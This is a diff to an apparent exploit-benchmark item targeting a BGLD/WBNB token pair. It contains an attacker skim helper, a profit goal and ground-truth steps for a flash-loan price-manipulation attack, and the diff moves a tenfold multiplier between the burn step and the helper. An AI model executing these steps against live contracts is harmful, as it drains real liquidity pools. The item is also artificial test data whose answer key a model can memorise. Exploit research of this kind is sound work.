@@ -18,7 +18,7 @@ ctrt_name2deploy:
 
 extra_actions:
   - "function burn_pair_bgld(uint256 amount) internal {
-    bgld.transfer(address(pair), amount);
+    bgld.transfer(address(pair), amount * 10);
     pair.skim(attacker);
     }"
 
@@ -40,7 +40,7 @@ attack_goal: "wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker"
 groundtruth:
   - ["borrow", "wbnb", "125e18"]
   - ["swap", "pair", "wbnb", "bgld", "wbnb.balanceOf(attacker)"]
-  - ["burn", "pair", "bgld", "bgld.balanceOf(address(pair)) * 10"]
+  - ["burn", "pair", "bgld", "bgld.balanceOf(address(pair))"]
   - ["sync", "pair"]
   - ["swap", "pair", "bgld", "wbnb", "100 * 1e6"]
   - ["payback", "wbnb", "125e18 * 1003 / 1000"]
